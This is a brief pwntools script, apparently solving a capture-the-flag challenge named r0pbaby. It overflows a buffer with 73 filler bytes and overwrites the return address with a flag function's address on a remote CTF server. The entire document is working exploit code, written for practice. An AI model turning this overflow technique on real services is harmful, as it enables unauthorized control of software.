#!/usr/bin/env python

from pwn import *

HOST = "ctf.yadunut.com"
PORT = 8001

payload = "A"*73
flag_address = p32(0x08048576)

r = remote(HOST, PORT)
#r = process('./r0pbaby')

r.recv()
r.recv()
r.sendline(payload+flag_address)
print r.recv()
print r.recv()
r.close()
